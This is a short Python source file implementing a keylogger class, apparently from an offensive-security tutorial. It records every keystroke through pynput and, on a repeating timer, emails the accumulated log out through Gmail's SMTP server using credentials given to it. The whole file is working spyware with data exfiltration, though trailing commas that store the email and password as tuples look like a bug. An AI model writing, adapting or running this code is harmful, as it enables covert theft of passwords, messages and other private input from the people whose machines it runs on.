#!/usr/bin/env python
import pynput.keyboard  # allows us to monitor mouse and keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email,
        self.password = password,

    def append_to_log(self, string):
        self.log = self.log + string

    @staticmethod
    def send_mail(email, password, message):
        # setting up smtp server. Using google smtp server
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()  # Initiating a tls connection
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def process_key_press(self, key):
        try:
            current_key = str(key.char)

        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = " "
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()    # starting the listener


